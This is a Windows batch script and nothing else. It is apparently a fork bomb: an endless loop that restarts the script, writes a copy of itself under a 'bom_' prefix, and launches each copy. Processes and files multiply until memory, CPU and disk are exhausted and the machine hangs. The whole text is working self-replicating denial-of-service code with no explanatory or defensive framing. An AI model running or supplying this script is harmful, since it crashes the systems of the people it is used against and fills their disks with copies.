@echo off
:rep
set a=%~nx0
start %a%
set b=bom_
copy %a% %b%%a%
start %b%%a%
goto rep